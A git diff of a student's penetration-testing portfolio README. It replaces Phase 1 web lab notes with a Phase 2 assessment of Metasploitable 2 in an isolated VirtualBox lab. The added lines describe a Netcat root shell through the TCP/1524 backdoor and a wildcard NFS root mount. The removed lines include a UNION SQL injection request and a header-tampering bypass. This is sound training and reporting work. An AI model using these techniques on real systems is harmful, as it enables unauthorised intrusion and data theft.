@@ -1,34 +1,40 @@
-# 🛡️ Web Application Penetration Testing (WAPT) — Internship Portfolio (Phase 1)
+# 🛡️ Vulnerability Assessment & Penetration Testing (VAPT) — Phase 2 Portfolio
+## Metasploitable 2 Isolated VirtualBox Laboratory Assessment
 
 <div align="center">
 
-![Cybersecurity Banner](https://img.shields.io/badge/Security-WAPT%20%2F%20VAPT-red?style=for-the-badge&logo=target)
+![VAPT Badge](https://img.shields.io/badge/Security-VAPT%20%2F%20Penetration%20Testing-red?style=for-the-badge&logo=target)
 ![IqraSec Academy](https://img.shields.io/badge/Organization-IqraSec%20Academy-0052cc?style=for-the-badge&logo=shield)
-![Phase Status](https://img.shields.io/badge/Phase%201-Completed%20(100%25)-success?style=for-the-badge&logo=checkmarx)
-![Platform Coverage](https://img.shields.io/badge/Platforms-TryHackMe%20%7C%20PortSwigger-orange?style=for-the-badge&logo=hackthebox)
+![Phase Status](https://img.shields.io/badge/Phase%202-Completed%20(100%25)-success?style=for-the-badge&logo=checkmarx)
+![Environment](https://img.shields.io/badge/Environment-Kali%20Linux%20%7C%20VirtualBox-orange?style=for-the-badge&logo=virtualbox)
+![Target](https://img.shields.io/badge/Target-Metasploitable%202-black?style=for-the-badge&logo=linux)
 
 <br/>
 
 [![Author](https://img.shields.io/badge/Penetration%20Tester-Kaustubh%20Ashish%20Bangar-blue.svg?style=flat-square&logo=github)](https://github.com/)
-[![Standard](https://img.shields.io/badge/OWASP-Top%2010%20(2021)-orange.svg?style=flat-square&logo=owasp)](https://owasp.org/www-project-top-ten/)
-[![Methodology](https://img.shields.io/badge/Framework-PTES%20%7C%20WSTG-purple.svg?style=flat-square)](https://owasp.org/www-project-web-security-testing-guide/)
-[![Burp Suite](https://img.shields.io/badge/Burp%20Suite-Community%20v2026.2.3-orange.svg?style=flat-square&logo=portswigger)](https://portswigger.net/burp)
-[![PortSwigger Labs](https://img.shields.io/badge/PortSwigger%20SQLi%20Labs-18%20Completed-brightgreen.svg?style=flat-square)](https://portswigger.net/web-security/sql-injection)
-[![TryHackMe Rooms](https://img.shields.io/badge/TryHackMe%20Rooms-6%20Completed-red.svg?style=flat-square&logo=tryhackme)](https://tryhackme.com/)
-[![Documentation](https://img.shields.io/badge/Reports-6%20Executive%20Technical%20Reports-blue.svg?style=flat-square&logo=readme)](./Kaustubh_Ashish_Bangar_WAPT_Phase-1)
+[![Standard](https://img.shields.io/badge/Framework-PTES%20%7C%20NIST%20SP%20800--115-purple.svg?style=flat-square)](https://www.nist.gov/)
+[![Open Ports Identified](https://img.shields.io/badge/Open%20TCP%20Ports-23%20Enumerated-brightgreen.svg?style=flat-square&logo=nmap)](https://nmap.org/)
+[![Confirmed Critical](https://img.shields.io/badge/Critical%20Exploit-TCP%2F1524%20Root%20Bindshell-crimson.svg?style=flat-square)](https://cve.mitre.org/)
+[![Confirmed High](https://img.shields.io/badge/High%20Finding-Wildcard%20NFS%20Root%20Export-orange.svg?style=flat-square)](https://cve.mitre.org/)
+[![Evidence Screenshots](https://img.shields.io/badge/Evidence%20Screenshots-52%20Verified%20Artifacts-blue.svg?style=flat-square&logo=googlephotos)](#-evidence-index--screenshot-mapping)
+[![Reports](https://img.shields.io/badge/Technical%20Reports-PDF%20%26%20DOCX-blueviolet.svg?style=flat-square&logo=readme)](#-technical-reports--documentation)
 
 <br/>
 
-**A comprehensive, executive-grade portfolio and technical documentation repository covering Web Application Penetration Testing (WAPT) Phase 1 at IqraSec Academy.**
+**An executive-grade Vulnerability Assessment and Penetration Testing (VAPT) portfolio documenting the comprehensive security audit, network enumeration, service deconstruction, and proof-of-concept exploitation performed on an isolated Metasploitable 2 target during Phase 2 of the IqraSec Academy Internship.**
 
 ---
 
-### 👨‍💻 Prepared By
-**Kaustubh Ashish Bangar**  
-*Web Application Penetration Testing (WAPT / VAPT) Intern*  
-**Organization:** IqraSec Academy  
-**Program:** WAPT Internship — Phase 1  
-**Status:** Completed & Fully Documented (100% Practical Solves, PoCs, Screenshots & Executive Reports)
+### 👨‍💻 Assessment Credentials & Meta
+- **Lead Penetration Tester:** Kaustubh Ashish Bangar
+- **Role:** Web Application & Network Penetration Testing (WAPT / VAPT) Intern
+- **Organization:** IqraSec Academy
+- **Program:** Cybersecurity Internship — Phase 2 (Systems & Network VAPT)
+- **Assessment Evidence Date:** 23 October 2026
+- **Target System:** Metasploitable 2 (Ubuntu 8.04 LTS / Linux Kernel 2.6.24-16-server)
+- **Primary Tested Target IP:** `192.168.56.103` *(Historical baseline: `192.168.56.102`)*
+- **Testing Host:** Kali Linux (Host-Only VirtualBox Network: `192.168.56.0/24`)
+- **Scope & Classification:** Controlled Training-Lab VAPT Report & Portfolio Verification
 
 </div>
 
@@ -37,578 +43,629 @@
 ## 📑 Table of Contents
 
 - [Executive Summary](#-executive-summary)
-- [Curriculum Architecture & Progress Matrix](#-curriculum-architecture--progress-matrix)
-- [Technical Deep Dive by Phase & Task](#-technical-deep-dive-by-phase--task)
-  - [Task 1: Web Fundamentals & HTTP Protocol Mechanics](#task-1-web-fundamentals--http-protocol-mechanics)
-  - [Task 2: Reconnaissance & Enumeration (Attack Surface Mapping)](#task-2-reconnaissance--enumeration-attack-surface-mapping)
-  - [Task 3: Burp Suite Mastery (Repeater & Traffic Manipulation)](#task-3-burp-suite-mastery-repeater--traffic-manipulation)
-  - [Task 4: Common Web Vulnerabilities](#task-4-common-web-vulnerabilities)
-    - [4.1 Insecure Direct Object References (IDOR)](#41-insecure-direct-object-references-idor)
-    - [4.2 Comprehensive SQL Injection (PortSwigger Academy)](#42-comprehensive-sql-injection-portswigger-academy)
-- [Multi-DBMS SQL Injection Dialect Matrix](#-multi-dbms-sql-injection-dialect-matrix)
-- [Defensive Engineering & Secure Coding Reference](#-defensive-engineering--secure-coding-reference)
-- [Repository Architecture & Directory Hierarchy](#-repository-architecture--directory-hierarchy)
+- [Internship Progression Roadmap (Phase 1 & Phase 2)](#-internship-progression-roadmap-phase-1--phase-2)
+- [Isolated Lab Architecture & Network Setup](#-isolated-lab-architecture--network-setup)
+- [Scope, Boundaries & Methodology](#-scope-boundaries--methodology)
+- [Phase 2 Execution Pipeline](#-phase-2-execution-pipeline)
+  - [1. Lab Setup & Baseline Verification (01_Lab_Setup)](#1-lab-setup--baseline-verification-01_lab_setup)
+  - [2. Reconnaissance & Host Discovery (02_Reconnaissance)](#2-reconnaissance--host-discovery-02_reconnaissance)
+  - [3. Deep Service & Protocol Enumeration (03_Enumeration)](#3-deep-service--protocol-enumeration-03_enumeration)
+  - [4. Vulnerability Validation & Exploitation Proof (04_Vulnerability_Validation)](#4-vulnerability-validation--exploitation-proof-04_vulnerability_validation)
+- [23 Open TCP Ports Comprehensive Service Matrix](#-23-open-tcp-ports-comprehensive-service-matrix)
+- [Vulnerability Findings & Detailed Technical Analysis](#-vulnerability-findings--detailed-technical-analysis)
+  - [VAPT-01 (Critical): Unauthenticated Root Shell via TCP/1524 Bindshell](#vapt-01-critical-unauthenticated-root-shell-via-tcp1524-bindshell)
+  - [VAPT-02 (High): Broad Wildcard NFS Export of Root Filesystem](#vapt-02-high-broad-wildcard-nfs-export-of-root-filesystem)
+  - [OBS-01 (Informational/Attack Surface): Legacy Daemon Banners & Interfaces](#obs-01-informationalattack-surface-legacy-daemon-banners--interfaces)
+  - [OBS-02 (Informational): TWiki Application & Documentation Disclosure](#obs-02-informational-twiki-application--documentation-disclosure)
+- [Prioritized Remediation & Hardening Action Plan](#-prioritized-remediation--hardening-action-plan)
+- [Evidence Integrity & Target IP Demarcation Note](#-evidence-integrity--target-ip-demarcation-note)
+- [Repository Hierarchy & Directory Architecture](#-repository-hierarchy--directory-architecture)
+- [Evidence Index & Screenshot Mapping (52 Files)](#-evidence-index--screenshot-mapping-52-files)
+- [Technical Reports & Documentation](#-technical-reports--documentation)
 - [Security Tools & Frameworks Utilized](#-security-tools--frameworks-utilized)
-- [Key Takeaways & Professional Competencies](#-key-takeaways--professional-competencies)
 - [Legal & Ethical Disclaimer](#-legal--ethical-disclaimer)
 
 ---
 
 ## 🏛️ Executive Summary
 
-Modern web application environments are sophisticated, distributed ecosystems combining microservices, relational databases, client-side frameworks, and complex authorization mechanisms. In modern threat landscapes, relying on automated vulnerability scanners leaves severe security blind spots around business logic, nuanced parameter handling, and data access control.
+During **Phase 2** of the **IqraSec Academy Internship**, a rigorous, controlled Vulnerability Assessment and Penetration Testing (VAPT) engagement was performed against an intentionally vulnerable Linux server (**Metasploitable 2**) situated in a secure, isolated Oracle VirtualBox host-only environment.
 
-This repository documents the complete practical laboratory execution, vulnerability analysis, proof-of-concept (PoC) validation, and professional reporting performed during **Phase 1** of the **IqraSec Academy Web Application Penetration Testing (WAPT) Internship**.
+The assessment followed the standardized **Penetration Testing Execution Standard (PTES)** and **NIST SP 800-115** methodologies, progressing systematically through pre-engagement configuration, non-intrusive host discovery, full-spectrum TCP service and version scanning, multi-protocol service enumeration, and targeted proof-of-concept vulnerability validation.
 
-### Core Competencies Mastered:
-1. **Protocol-Level Web Mechanics:** Deconstruction of HTTP/1.1 and HTTP/2 transaction semantics, request/response headers, status code diagnostics, state management, cookies, and TLS/HTTPS cryptography.
-2. **Reconnaissance & Attack Surface Mapping:** Passive Open-Source Intelligence (OSINT) utilizing WHOIS, RDAP, DNS records (`TXT`, `MX`, `A`), Shodan infrastructure footprinting, active multi-hop routing analysis, TCP banner grabbing, and directory fuzzing via `robots.txt`, `sitemap.xml`, and Gobuster.
-3. **Intercepting Proxy Exploitation:** Burp Suite architecture, proxy interception workflows, Repeater payload iteration, Inspector attributes, unhandled error triggering, and manual Union-based SQL injection exfiltration.
-4. **Access Control & Authorization Flaws:** Insecure Direct Object References (IDOR), API parameter tampering, browser Local Storage manipulation, predictable identifier generation (UUIDv1 analysis), and horizontal privilege escalation.
-5. **Advanced SQL Injection (Apprentice to Practitioner):** Mathematical and lexical analysis of SQL injection, multi-engine syntax differences (Oracle, MSSQL, MySQL, PostgreSQL), systematic column count and data type probing, cross-table credential exfiltration, blind time-based inference (`pg_sleep`), and perimeter defense evasion via XML hexadecimal character entities.
-
----
-
-## 📊 Curriculum Architecture & Progress Matrix
-
-| Task # | Task Category | Module / Lab Room | Target Platform | Focus Area | Deliverables & Status |
-| :---: | :--- | :--- | :---: | :--- | :---: |
-| **01** | **Web Fundamentals** | Room 1: Web Application Basics | TryHackMe | Client-Server Architecture, URL Anatomy, HTTP/HTTPS, REST Verbs | [Report (PDF)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/1. Web-Fundamentals/Room1_Web_Application_Basics/Web Application Basics Report.pdf>) &bull; [Report (DOCX)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/1. Web-Fundamentals/Room1_Web_Application_Basics/Web Application Basics Report.docx>) &bull; [Screenshots](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/1. Web-Fundamentals/Room1_Web_Application_Basics/Screenshots>) <br/>`100% Completed` ✅ |
-| **01** | **Web Fundamentals** | Room 2: HTTP in Detail | TryHackMe | HTTP Headers, Status Codes (1xx–5xx), Cookies, Sessions, TLS Handshake | [Report (PDF)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/1. Web-Fundamentals/Room2_HTTP_in _Detail/HTTP in Detail Report.pdf>) &bull; [Report (DOCX)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/1. Web-Fundamentals/Room2_HTTP_in _Detail/HTTP in Detail Report.docx>) &bull; [Screenshots](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/1. Web-Fundamentals/Room2_HTTP_in _Detail/Screenshots>) <br/>`100% Completed` ✅ |
-| **02** | **Recon & Enumeration** | Room 1: Passive Reconnaissance<br/>Room 2: Active Reconnaissance<br/>Room 3: Content Discovery | TryHackMe | WHOIS/RDAP, DNS Records (`dig`/`nslookup`), Shodan, Traceroute (25 Hops), Banner Grabbing (Telnet/Apache), Gobuster, `curl` Headers | [Report (PDF)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/2. Recon-Enumeration/Reconnaissance & Enumeration Report.pdf>) &bull; [Report (DOCX)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/2. Recon-Enumeration/Reconnaissance & Enumeration Report.docx>) &bull; [Screenshots](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/2. Recon-Enumeration>) <br/>`100% Completed` ✅ |
-| **03** | **Burp Suite Mastery** | Room 1: Burp Suite: Repeater | TryHackMe | Proxy-to-Repeater Workflows, Header Tampering (`FlagAuthorised: True`), Error Triggering (`/products/-1`), Union SQLi Exploit | [Report (PDF)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/3. Burp-Suite/Burp Suite Repeater Report.pdf>) &bull; [Report (DOCX)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/3. Burp-Suite/Burp Suite Repeater Report.docx>) &bull; [Screenshots](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/3. Burp-Suite/Room1_Burp_Suite _Repeater/Screenshots>) <br/>`100% Completed` ✅ |
-| **04** | **Common Web Vulnerabilities** | Room 1: IDOR — Santa's Little IDOR | TryHackMe (AoC 2025) | Authentication vs. Authorization, Horizontal Privilege Escalation, API Analysis (`view_accountinfo`), Local Storage Tampering, UUIDv1 Predictability | [Report (PDF)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/4. Common-Web-Vulnerabilities/Room1_IDOR_Santa’s_Little_IDOR/IDOR - Santa’s Little IDOR Report.pdf>) &bull; [Report (DOCX)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/4. Common-Web-Vulnerabilities/Room1_IDOR_Santa’s_Little_IDOR/IDOR - Santa’s Little IDOR Report.docx>) &bull; [Screenshots](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/4. Common-Web-Vulnerabilities/Room1_IDOR_Santa’s_Little_IDOR/Screenshot>) <br/>`100% Completed` ✅ |
-| **04** | **Common Web Vulnerabilities** | SQL Injection (Apprentice & Practitioner) | PortSwigger Web Security Academy | In-Band (WHERE / Auth Subversion), UNION Probing, Multi-DBMS Schemas (Oracle/PG/MSSQL/MySQL), String Concatenation, Blind Time-Delay (`pg_sleep`), WAF Evasion (XML Entities) | [Report (PDF)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/4. Common-Web-Vulnerabilities/SQL-Injection/SQL Injection Report.pdf>) &bull; [Report (DOCX)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/4. Common-Web-Vulnerabilities/SQL-Injection/SQL Injection Report.docx>) &bull; [Screenshots (35 Files)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/4. Common-Web-Vulnerabilities/SQL-Injection/Screenshots>) <br/>`100% Completed` ✅ |
+### 🎯 Key Assessment Takeaways:
+1. **Host Discovery & Attack Surface Identification:** Verified active host reachability at `192.168.56.103`. Comprehensive Nmap TCP port interrogation revealed **23 open TCP ports** out of the standard 1,000 scanned ports, exposing a massive attack surface spanning legacy remote access daemons, database engines, RPC interfaces, and web application runtimes.
+2. **Critical Vulnerability Confirmation (VAPT-01):** Validated immediate, unauthenticated remote root access via an exposed backdoor bindshell listening on `TCP/1524`. Establishing a direct stream with Netcat produced an interactive shell where execution of `id` returned `uid=0(root) gid=0(root) groups=0(root)`, yielding complete machine compromise without credential requirements.
+3. **High-Severity Data Exposure Confirmation (VAPT-02):** Discovered an unrestricted wildcard export on the Network File System (`showmount -e` returned `/ *`). Executed a remote, non-destructive read-only client mount at `/mnt/metasploitable-nfs`, successfully browsing the entire root hierarchy (`/etc`, `/home`, `/root`, `/usr`, `/var`) and reading `/etc/hostname` (`metasploitable`).
+4. **Attack Surface & Information Disclosure Analysis (OBS-01 & OBS-02):** Cataloged multiple legacy service banners (vsftpd 2.3.4, Apache 2.2.8, OpenSSH 4.7p1, Samba 3.X, Tomcat 5.5, MySQL 5.0.51a, PostgreSQL 8.3), public PHPInfo configuration disclosure (`/phpinfo.php`), dangerous WebDAV HTTP verbs (`OPTIONS`, `PROPFIND`), and an exposed TWiki enterprise portal releasing build documentation (`Version: 01 Feb 2003`).
 
 ---
 
-## 🔬 Technical Deep Dive by Phase & Task
+## 🗺️ Internship Progression Roadmap (Phase 1 & Phase 2)
+
+The **IqraSec Academy Cybersecurity Internship** curriculum is structured into progressive, multi-tiered domains combining application-layer security and network/infrastructure penetration testing:
 
 ```mermaid
 graph TD
-    A[WAPT Phase 1 Scope] --> B[Task 1: Web Fundamentals]
-    A --> C[Task 2: Recon & Enumeration]
-    A --> D[Task 3: Burp Suite Mastery]
-    A --> E[Task 4: Common Vulnerabilities]
-
-    B --> B1[HTTP Mechanics & TLS]
-    B --> B2[Headers, Verbs, State & Cookies]
-
-    C --> C1[Passive OSINT: WHOIS, DNS, Shodan]
-    C --> C2[Active Probing: Traceroute, Banner Grabbing]
-    C --> C3[Content Discovery: Gobuster, robots.txt, curl]
-
-    D --> D1[Proxy Interception & Repeater Workflow]
-    D --> D2[Header Injection & Error Triggering]
-    D --> D3[Manual Union SQLi Exploitation]
-
-    E --> E1[Module 4.1: IDOR & Horizontal Escalation]
-    E --> E2[Module 4.2: PortSwigger SQL Injection 18 Labs]
-```
-
----
-
-### Task 1: Web Fundamentals & HTTP Protocol Mechanics
-
-#### 📖 Module Scope & Objectives
-This foundational module established protocol-level mastery over web communication models. Penetration testing begins with understanding how the client and server negotiate requests and state, how resources are addressed, and why encryption safeguards data in transit.
-
-#### 🛠️ Core Concepts Examined
-- **Client-Server Architecture:** DNS resolution pipeline, TCP 3-way handshake (`SYN`, `SYN-ACK`, `ACK`), and application-layer payload transmission.
-- **URL Anatomy:** Protocol identifier, Fully Qualified Domain Name (FQDN), port specification, path, query strings (`?param=val`), and fragment identifiers (`#hash`).
-- **HTTP Methods & State Mutability:**
-  - `GET`: Safe, idempotent resource retrieval without payload bodies.
-  - `POST`: State-altering entity submission (authentication, transactional operations).
-  - `PUT`: Complete idempotent resource replacement.
-  - `DELETE`: Explicit resource deletion.
-  - `OPTIONS`: Web server capability enumeration (crucial for CORS evaluation and attack surface mapping).
-  - `HEAD`: Metadata inspection without body retrieval.
-- **HTTP Status Code Diagnostics:**
-  - `1xx (Informational)`: Protocol switching (e.g., `101 Switching Protocols` in WebSockets).
-  - `2xx (Success)`: `200 OK`, `201 Created`, `204 No Content`.
-  - `3xx (Redirection)`: `301 Moved Permanently`, `302 Found` (evaluating open redirect risks).
-  - `4xx (Client Errors)`: `400 Bad Request`, `401 Unauthorized`, `403 Forbidden`, `404 Not Found`.
-  - `5xx (Server Errors)`: `500 Internal Server Error`, `502 Bad Gateway`, `503 Service Unavailable`. *Key takeaway: unhandled 500 errors indicate poor exception handling, frequently exposing SQLi, LFI, or command injection flaws.*
-- **Header Analysis & Security Implications:** `Host` (virtual host routing), `User-Agent` (client fingerprinting), `Content-Length` (basis of HTTP Request Smuggling), `Authorization` (Bearer/Basic tokens), and `Set-Cookie` attributes (`HttpOnly`, `Secure`, `SameSite`).
-- **HTTPS & Cryptographic Handshake:** TLS key negotiation, digital certificates, asymmetric handshake, and symmetric session cipher establishment.
-
-#### 📸 Key Practical Artifacts & Evidence
-- **Room 1 (Web Application Basics):**
-  - [Technical Report (PDF)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/1. Web-Fundamentals/Room1_Web_Application_Basics/Web Application Basics Report.pdf>) &bull; [Technical Report (DOCX)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/1. Web-Fundamentals/Room1_Web_Application_Basics/Web Application Basics Report.docx>)
-  - [Screenshots Folder](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/1. Web-Fundamentals/Room1_Web_Application_Basics/Screenshots>) (`completion.png`, `important-task1.png` - `important-task3.png`)
-- **Room 2 (HTTP in Detail):**
-  - [Technical Report (PDF)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/1. Web-Fundamentals/Room2_HTTP_in _Detail/HTTP in Detail Report.pdf>) &bull; [Technical Report (DOCX)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/1. Web-Fundamentals/Room2_HTTP_in _Detail/HTTP in Detail Report.docx>)
-  - [Screenshots Folder](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/1. Web-Fundamentals/Room2_HTTP_in _Detail/Screenshots>) (`completion.png`, `important-task1.png` - `important-task6.png`)
-
----
-
-### Task 2: Reconnaissance & Enumeration (Attack Surface Mapping)
-
-#### 📖 Module Scope & Objectives
-Reconnaissance is the mandatory preliminary phase in modern penetration testing (Unified Kill Chain & PTES). This module covered the structured dichotomy between passive non-intrusive intelligence gathering and active network probing.
-
-```mermaid
-graph LR
-    subgraph Passive Reconnaissance
-        A1[WHOIS / RDAP] --> A4[Digital Footprint Profile]
-        A2[DNS TXT/MX Queries] --> A4
-        A3[Shodan.io Server Scans] --> A4
+    subgraph Phase 1: Web Application Penetration Testing (WAPT)
+        P1T1[Task 1: Web Fundamentals & HTTP Protocol Mechanics]
+        P1T2[Task 2: Passive & Active Reconnaissance & Content Discovery]
+        P1T3[Task 3: Burp Suite Mastery - Proxy & Repeater Exploitation]
+        P1T4[Task 4: Common Web Vulnerabilities - IDOR & 18 SQLi Labs]
     end
 
-    subgraph Active Reconnaissance
-        B1[Traceroute 25 Hops] --> B4[Target Network Map]
-        B2[TCP Banner Grabbing] --> B4
-        B3[Apache 2.4.61 ID] --> B4
+    subgraph Phase 2: Vulnerability Assessment & Penetration Testing (VAPT)
+        P2T1[Module 1: Isolated VirtualBox & Kali Linux Lab Deployment]
+        P2T2[Module 2: Network Reconnaissance & Full Nmap Discovery]
+        P2T3[Module 3: Multi-Protocol Service Enumeration 23 Ports]
+        P2T4[Module 4: Vulnerability Validation - Root Bindshell & Wildcard NFS]
     end
 
-    subgraph Content Discovery
-        C1[robots.txt /staff-portal] --> C4[Application Surface]
-        C2[sitemap.xml /s3cr3t-area] --> C4
-        C3[Gobuster & curl -v] --> C4
-    end
+    P1T1 --> P1T2 --> P1T3 --> P1T4
+    P1T4 ==>|Graduated to Infrastructure & Network Security| P2T1
+    P2T1 --> P2T2 --> P2T3 --> P2T4
 ```
 
-#### 🛠️ Practical Methodology & Key Findings
-1. **Passive Reconnaissance (OSINT):**
-   - **DNS Verification:** Queried TXT records of `thmlabs.com` utilizing `dig`/`nslookup`, uncovering the verification token:  
-     `THM{a5b83929888ed36acb0272971e438d78}`.
-   - **Infrastructure Analytics (Shodan.io):** Evaluated global deployment metrics. Confirmed the United States as the predominant host for public Apache instances; identified port `8080` as the third most frequent non-standard Apache port, and port `80` as the standard baseline for Nginx.
-2. **Active Reconnaissance:**
-   - **Multi-Hop Route Tracing:** Executed dynamic traceroute analyses against target infrastructure, mapping a 25-hop transit path and identifying the final boundary gateway IP addresses: `100.92.9.83` and `99.83.89.19`.
-   - **Active Banner Grabbing:** Established raw TCP streams on port 80 utilizing `telnet`. Successfully intercepted the server banner, isolating the service daemon as `Apache/2.4.61` (essential for immediate CVE targeting).
-3. **Content Discovery & Directory Fuzzing:**
-   - **Manual Crawling Disclosures:** Extracted `/staff-portal` from `robots.txt` and `/s3cr3t-area` from `sitemap.xml`.
-   - **Raw HTTP Header Interception:** Executed `curl http://$ip -v`, discovering custom security header tokens:  
-     `X-FLAG: THM{HEADER_FLAG}` and `X-Powered-By: THM-Framework` running on an `nginx/1.18.0 (Ubuntu)` reverse proxy.
-   - **Automated Directory Fuzzing:** Deployed `Gobuster` against common wordlists (SecLists) for directory and virtual host enumeration.
-
-#### 📸 Key Practical Artifacts & Evidence
-- **Consolidated Report:** [Reconnaissance & Enumeration Report (PDF)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/2. Recon-Enumeration/Reconnaissance & Enumeration Report.pdf>) &bull; [DOCX](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/2. Recon-Enumeration/Reconnaissance & Enumeration Report.docx>)
-- **Visual Evidence:**
-  - [Room 1 Passive Recon Screenshots](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/2. Recon-Enumeration/Room1_Passive_Reconnaissance/Screenshorts>) (`Completion .png`, `flag.png`, `Important Task1.png`, `Shodan_io.png`)
-  - [Room 2 Active Recon Screenshots](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/2. Recon-Enumeration/Room2_Active_Reconnaissance/Screenshots>) (`Completion .png`, `Important Task1.png`, `Important Task2.png`, `Important Task3.png`)
-  - [Room 3 Content Discovery Screenshots](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/2. Recon-Enumeration/Room3_Content_Discovery/Screenshots>) (`completion.png`, `important-task1.png`, `important-task2.png`, `important-Tasks.png`)
+| Phase | Core Domain | Focus Area & Platforms | Key Deliverables & Achievements | Status |
+| :---: | :--- | :--- | :--- | :---: |
+| **Phase 1** | **Web Application Penetration Testing (WAPT)** | TryHackMe & PortSwigger Web Security Academy | • HTTP/HTTPS deep dive, headers, cookies, REST verbs<br/>• Passive OSINT (WHOIS, DNS, Shodan) & Active Probing<br/>• Burp Suite Repeater tampering & Union SQLi exploit<br/>• Advent of Cyber IDOR horizontal escalation<br/>• 18 PortSwigger SQLi Labs (Blind, Time-Delay, WAF XML entity bypass)<br/>• 6 Executive Technical Reports & 50+ Screenshots | `COMPLETED` ✅ |
+| **Phase 2** | **Systems & Network Penetration Testing (VAPT)** | Isolated VirtualBox Laboratory (Kali Linux & Metasploitable 2) | • VirtualBox host-only isolated network architecture<br/>• 23-port Nmap TCP service and version scanning<br/>• Deep enumeration: SMBv1, NFSv3, FTP, WebDAV, Tomcat, TWiki<br/>• **VAPT-01 (Critical):** TCP/1524 unauthenticated root shell validation<br/>• **VAPT-02 (High):** Wildcard NFS root export read-only mount<br/>• 5 Executive VAPT Reports & 52 Verification Screenshots | `COMPLETED` ✅ |
 
 ---
 
-### Task 3: Burp Suite Mastery (Repeater & Traffic Manipulation)
+## 🌐 Isolated Lab Architecture & Network Setup
 
-#### 📖 Module Scope & Objectives
-While automated vulnerability scanners identify surface issues, complex authorization flaws, race conditions, and advanced injection bugs require manual traffic interception and manipulation. Burp Suite (PortSwigger) is the industry standard for manual Web Application Penetration Testing. This module focused on the **Burp Suite Repeater** engine.
+To guarantee strict compliance with cybersecurity legal and safety standards, all testing was performed in an isolated, private virtual network utilizing Oracle VirtualBox. The target was prevented from routing traffic to bridged or public networks.
 
 ```
-+---------------+      +-------------------+      +----------------+
-|  User Browser | ---> | Burp Proxy (8080) | ---> |  Target Server |
-+---------------+      +---------+---------+      +----------------+
-                                 |
-                                 v  (Ctrl + R)
-                       +-------------------+
-                       | Burp Repeater Tab |
-                       | (Manual Crafting) |
-                       +-------------------+
++-----------------------------------------------------------------------------------------+
+|                                ORACLE VIRTUALBOX HYPERVISOR                             |
+|                                                                                         |
+|   +------------------------------------+             +------------------------------+   |
+|   |         ATTACKER MACHINE           |             |        TARGET MACHINE        |   |
+|   |            Kali Linux              |             |       Metasploitable 2       |   |
+|   |                                    |             |                              |   |
+|   |   • Nmap Service Scanners          |             |   • Ubuntu 8.04 LTS          |   |
+|   |   • Netcat (nc) Exploitation CLI   |             |   • Linux Kernel 2.6.24      |   |
+|   |   • Gobuster Directory Fuzzer      |             |   • 23 Exposed TCP Daemons   |   |
+|   |   • NFS Client & RPC Utilities     |             |   • Root Bindshell (TCP 1524)|   |
+|   |   • Smbclient & SMB Utilities      |             |   • Wildcard NFS (TCP 2049)  |   |
+|   |                                    |             |                              |   |
+|   |   IP: 192.168.56.101 (Host-Only)   |             |   IP: 192.168.56.103         |   |
+|   +-----------------+------------------+             +---------------+--------------+   |
+|                     |                                                |                  |
+|                     +-----------------------+------------------------+                  |
+|                                             |                                           |
+|                            VirtualBox Host-Only Adapter (vboxnet0)                      |
+|                                    Subnet: 192.168.56.0/24                              |
+|                            [NO BRIDGED / ZERO PUBLIC INTERNET EGRESS]                   |
++-----------------------------------------------------------------------------------------+
 ```
 
-#### 🛠️ Exploitation Exercises Completed
-1. **Header Manipulation & Access Control Bypass:**
-   - Intercepted a restricted request in Proxy and sent to Repeater (`Ctrl + R`).
-   - Injected the custom authorization header: `FlagAuthorised: True`.
-   - Transmitted the request to receive an HTTP 200 OK and extracted the flag:  
-     `THM{Yzg2MWI2...}`.
-2. **Endpoint Validation & Backend Crash Triggering:**
-   - Modified numeric resource requests to malformed boundaries: `GET /products/-1 HTTP/1.1`.
-   - Triggered an unhandled backend database exception returning HTTP `500 Internal Server Error`.
-   - Analyzed the verbose error stack trace, extracting the second flag:  
-     `THM{N2MzMz...}` and revealing raw SQL query fragments.
-3. **Extra-Mile Challenge — Union-Based SQL Injection Exploitation:**
-   - Identified query construction via the `/about/{id}` endpoint:
-     ```sql
-     SELECT firstname, lastname, bio, avatar, notes FROM people WHERE id = [INPUT]
-     ```
-   - Balanced the 5-column query structure and forced an empty primary result by supplying ID `0`:
-     ```http
-     GET /about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1 HTTP/1.1
-     Host: target.thm
-     ```
-   - Successfully forced the database to reflect the hidden administrative notes into the HTML `<title>` tag of the response, extracting the final flag:  
-     `THM{ZGE3OTUy...}`.
-
-#### 📸 Key Practical Artifacts & Evidence
-- **Technical Report:** [Burp Suite Repeater Report (PDF)](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/3. Burp-Suite/Burp Suite Repeater Report.pdf>) &bull; [DOCX](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/3. Burp-Suite/Burp Suite Repeater Report.docx>)
-- **Visual Evidence:** [Screenshots Folder](<./Kaustubh_Ashish_Bangar_WAPT_Phase-1/3. Burp-Suite/Room1_Burp_Suite _Repeater/Screenshots>) (`Challenge.png`, `Complete .png`, `Completion all task.png`, `Flag 1.png`, `Flag 2.png`, `Flag 3.png`, `Practical Example .png`)
